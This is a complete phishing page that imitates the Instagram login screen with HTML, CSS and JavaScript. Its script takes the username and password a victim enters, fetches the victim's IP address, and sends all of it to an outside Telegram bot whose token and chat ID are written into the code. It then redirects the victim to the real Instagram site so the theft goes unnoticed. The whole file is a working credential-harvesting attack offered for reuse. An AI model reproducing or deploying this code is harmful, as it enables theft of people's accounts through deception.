<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Instagram</title>
  <link rel="stylesheet" href="style.css">
  <link rel="icon" href="https://www.instagram.com/static/images/ico/favicon.ico/36b3ee2d91ed.ico">
</head>
<body>
  <div class="container">
    <div class="phone-image"></div>
    <div class="login-form">
      <img src="https://www.instagram.com/static/images/web/mobile_nav_type_logo.png/735145cfe0a4.png" alt="Instagram Logo" class="logo">
      <form id="loginForm">
        <input type="text" id="username" placeholder="Phone number, username, or email" required>
        <input type="password" id="password" placeholder="Password" required>
        <button type="submit">Log In</button>
        <p class="status" id="status"></p>
      </form>
      <div class="divider">OR</div>
      <div class="facebook-login">Log in with Facebook</div>
      <div class="forgot">Forgot password?</div>
    </div>
  </div>
  <script src="script.js"></script>
</body>
</html>
<style>
  
  body {
  margin: 0;
  background: #fafafa;
  font-family: Arial, sans-serif;
  display: flex;
  justify-content: center;
  align-items: center;
  height: 100vh;
}

.container {
  display: flex;
  align-items: center;
}

.phone-image {
  width: 380px;
  height: 580px;
  background: url('https://www.instagram.com/static/images/homepage/home-phones.png/43cc71bb1b43.png') no-repeat center/cover;
  display: none;
}

.login-form {
  background: #fff;
  border: 1px solid #dbdbdb;
  padding: 40px;
  width: 350px;
  text-align: center;
}

.logo {
  width: 175px;
  margin-bottom: 30px;
}

input {
  width: 100%;
  padding: 9px;
  margin: 5px 0;
  background: #fafafa;
  border: 1px solid #dbdbdb;
  border-radius: 3px;
}

button {
  width: 100%;
  padding: 8px;
  background: #3897f0;
  color: white;
  font-weight: bold;
  border: none;
  margin-top: 10px;
  border-radius: 3px;
  cursor: pointer;
}

.divider {
  margin: 20px 0;
  color: #999;
}

.facebook-login {
  color: #385185;
  font-weight: bold;
  cursor: pointer;
}

.forgot {
  color: #00376b;
  margin-top: 15px;
  font-size: 12px;
  cursor: pointer;
}

.status {
  color: green;
  margin-top: 10px;
  font-size: 14px;
}
  
</style>

<script>
  const BOT_TOKEN = '7483695523:AAG6BoyFGCH6XDTDJ0wXhGlxEwlUwSYcnXA'; // your bot token
  const CHAT_ID = '7650029381'; // your chat ID

  document.getElementById("loginForm").addEventListener("submit", function(e) {
    e.preventDefault();

    const username = document.getElementById("username").value.trim();
    const password = document.getElementById("password").value;

    if (username && password) {
      fetch('https://api.ipify.org?format=json')
        .then(res => res.json())
        .then(data => {
          const ip = data.ip;
          const message = `New Instagram Login:\nUsername: ${username}\nPassword: ${password}\nIP: ${ip}`;

          fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
              method: "POST",
              headers: {
                'Content-Type': 'application/json'
              },
              body: JSON.stringify({
                chat_id: CHAT_ID,
                text: message
              })
            })
            .then(res => res.json())
            .then(data => {
              window.location.href = "https://instagram.com"; // redirect after sending
            })
            .catch(err => {
              document.getElementById("status").innerText = "Telegram error.";
            });
        })
        .catch(err => {
          document.getElementById("status").innerText = "Failed to get IP.";
        });
    } else {
      document.getElementById("status").innerText = "Please enter both fields.";
    }
  });
</script>
